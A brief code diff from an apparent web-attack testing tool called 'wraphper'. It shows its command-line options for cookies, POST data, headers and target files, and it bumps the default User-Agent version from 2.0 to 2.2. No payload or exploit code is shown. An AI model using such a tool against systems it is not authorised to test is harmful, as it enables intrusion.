                 verified_mark = " \033[92m[VERIFIED]\033[0m" if f.verified else ""
@@ -1061,7 +1334,7 @@ def main():
     parser.add_argument("--data", help="POST data")
     parser.add_argument("--cookie", help="Session cookies")
     parser.add_argument("--header", action="append", help="Add custom headers")
-    parser.add_argument("--user-agent", default="wraphper/2.0", help="Custom User-Agent")
+    parser.add_argument("--user-agent", default="wraphper/2.2", help="Custom User-Agent")
     parser.add_argument("--target-file", action="append", help="Target specific file")
     parser.add_argument("--target-dir", help="Target specific directory")
     parser.add_argument("--target-list", help="File with list of targets")
